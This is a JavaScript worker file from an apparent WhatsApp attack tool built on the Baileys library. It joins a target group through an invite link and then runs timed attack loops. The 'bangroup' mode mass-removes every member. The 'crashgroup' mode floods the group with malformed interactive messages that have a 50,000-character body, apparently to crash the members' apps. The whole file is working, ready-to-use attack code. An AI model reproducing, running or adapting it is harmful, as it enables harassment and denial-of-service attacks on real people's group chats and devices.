// groupAttackWorker.js
const { parentPort, workerData } = require('worker_threads');
const { makeWASocket, useMultiFileAuthState, makeCacheableSignalKeyStore } = require('@whiskeysockets/baileys');
const pino = require('pino');

const debugLog = (msg) => process.stderr.write(`[GROUP-WORKER] ${msg}\n`);
const SILENT_LOGGER = pino({ level: 'silent' });
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

async function run() {
    const { authPath, groupLink, attackType, durationMs } = workerData;

    debugLog(`=====================================`);
    debugLog(`Group Worker started`);
    debugLog(`  Attack Type: ${attackType}`);
    debugLog(`  Group Link: ${groupLink}`);
    debugLog(`  Duration: ${durationMs}ms`);
    debugLog(`=====================================`);

    let sock = null;
    let stopRequested = false;

    parentPort.on('message', (msg) => {
        if (msg && msg.type === 'stop') {
            debugLog(`Stop requested by parent`);
            stopRequested = true;
        }
    });

    try {
        const { state } = await useMultiFileAuthState(authPath);

        sock = makeWASocket({
            logger: SILENT_LOGGER,
            printQRInTerminal: false,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, SILENT_LOGGER),
            },
            browser: ['Mac OS', 'Safari', '10.15.7'],
            markOnlineOnConnect: false,
            syncFullHistory: false,
            shouldIgnoreJid: () => true,
            getMessage: async () => undefined,
        });

        await new Promise((resolve, reject) => {
            const timeout = setTimeout(() => reject(new Error('Connect timeout (15s)')), 15000);
            sock.ev.on('connection.update', (update) => {
                if (update.connection === 'open') { clearTimeout(timeout); resolve(); }
                if (update.connection === 'close') {
                    clearTimeout(timeout);
                    reject(new Error(`Connection closed: ${update.lastDisconnect?.error?.message || 'unknown'}`));
                }
            });
        });

        debugLog(`Connected successfully`);

        const inviteCode = String(groupLink).split('chat.whatsapp.com/')[1]?.split('?')[0];
        if (!inviteCode) throw new Error('Invalid group invite link — must be chat.whatsapp.com/XXXX');

        let metadata;
        try {
            metadata = await sock.groupGetInviteInfo(inviteCode);
        } catch (e) {
            throw new Error(`Failed to resolve group: ${e.message}`);
        }

        const groupId = metadata.id;
        const groupName = metadata.subject;

        parentPort.postMessage({
            type: 'info',
            groupId,
            groupName,
            participants: metadata.participants?.length || 0,
        });

        debugLog(`Group resolved: ${groupName} (${groupId})`);

        const startTime = Date.now();
        let cycles = 0;

        while (!stopRequested && (Date.now() - startTime) < durationMs) {
            cycles++;
            debugLog(`--- Cycle ${cycles} ---`);

            try {
                if (attackType === 'bangroup') {
                    const groupMetadata = await sock.groupMetadata(groupId);
                    const participants = (groupMetadata.participants || [])
                        .filter(p => p.id !== sock.user.id);

                    for (const m of participants) {
                        if (stopRequested) break;
                        await sock.groupParticipantsUpdate(groupId, [m.id], "remove").catch(() => {});
                        await sleep(15);
                    }
                } else if (attackType === 'crashgroup') {
                    for (let i = 0; i < 20; i++) {
                        if (stopRequested) break;
                        try {
                            await sock.relayMessage(groupId, {
                                interactiveMessage: {
                                    body: { text: "./" + "x".repeat(50000) },
                                    nativeFlowMessage: { buttons: [{}] },
                                    contextInfo: { mentionedJid: [groupId] }
                                }
                            }, {});
                        } catch (e) {}
                        await sleep(100);
                    }
                }
            } catch (e) {
                debugLog(`Cycle ${cycles} error: ${e.message}`);
            }

            parentPort.postMessage({
                type: 'progress',
                cycles,
                elapsedMs: Date.now() - startTime,
            });

            await sleep(500);
        }

        try { sock.end(undefined); } catch (e) {}

        debugLog(`=====================================`);
        debugLog(`Group attack complete — ${cycles} cycles`);
        debugLog(`=====================================`);

        parentPort.postMessage({
            type: 'done',
            cycles,
            durationMs: Date.now() - startTime,
            groupName,
            groupId,
        });

    } catch (err) {
        debugLog(`FATAL: ${err.message}`);
        try { if (sock) sock.end(undefined); } catch (e) {}
        parentPort.postMessage({ type: 'error', error: err.message });
    }
}

run();